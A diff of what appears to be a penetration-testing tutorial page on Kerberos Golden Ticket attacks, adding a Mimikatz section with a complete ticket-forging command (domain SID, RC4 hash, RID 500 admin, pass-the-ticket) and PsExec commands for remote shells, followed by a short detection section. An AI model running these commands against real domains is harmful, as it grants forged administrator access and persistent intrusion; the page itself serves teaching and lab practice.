@@ -16,10 +16,6 @@ toc: true
 * Golden Ticket give attackers unrestricted access to networked resources and the ability to forge new tickets, allowing them to reside on networks indefinitely by being disguised as credentialed administrator-level users.
 
 
-
-
-
-
 ## Forging Kerberos Tickets
 * Forging Kerberos tickets depends on the password hash available to the attacker
 * Golden Ticket requires the KRBTGT password hash.
@@ -31,7 +27,6 @@ toc: true
  * SID
  * Domain KRBTGT Account NTLM password hash
  * Impersonate user
- 
  
 ```
 kerberos::golden  ## Name of the module  
@@ -46,6 +41,20 @@ kerberos::golden  ## Name of the module
 /renewmax:10080  ##Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 
 ```
 ## golden ticket with Mimikatz
+Mimikatz is available for Kerberos attack, it allows to create the forged ticket and simultaneously pass the TGT to KDC service
+ 
+generate the ticket for impersonating user with RID 500. 
+```
+kerberos::golden /domain:karim.net /sid:S-1-5-21-750046758-1551849808-2392872301 /rc4:564e72d3c6c1927de1d2f252665e7c54  /user:admin /id:500 /ptt
+```
+<img src="/img/golden/m1.PNG" alt="Getting-gz" width="800" height="150"> 
+get a new cmd prompt which will allow to connect with domain server using PsExec.exe
+
+```
+PsExec64.exe \\10.0.0.1 powershell.exe
+```
+<img src="/img/golden/connectm.PNG" alt="Getting-gz" width="800" height="150"> 
+
 ## golden ticket with Impacket
 used for lookupid python script to enumerate the Domain SID.
 ```
@@ -84,7 +93,7 @@ misc::cmd
 ```
 
 <img src="/img/golden/connect1.PNG" alt="Getting-gz" width="800" height="150"> 
-
+* get a new cmd prompt which will allow to connect with domain server using PsExec.exe
 access the service.
 ```
 PsExec64.exe \\10.0.0.1 cmd.exe
@@ -92,7 +101,6 @@ PsExec64.exe \\10.0.0.1 cmd.exe
 
 <img src="/img/golden/hh.PNG" alt="Getting-gz" width="800" height="150"> 
 
-## golden ticket with Rubeus.exe
 ## Detection
  * detecting a golden ticket attack depends on the method used. If the Mimikatz tool was dropped in your environment, antivirus might identify and block it. That said, Mimikatz itself is very simple to modify, changing its hash and invalidating any hash-based detection. 
  *  detection will ultimately rely on watching for unusual behavior. This could look like accounts accessing systems they would not normally access or accounts authenticating with different accounts. It could also be SIDs that do not match the username or generic usernames in use that do not exist in the environment.
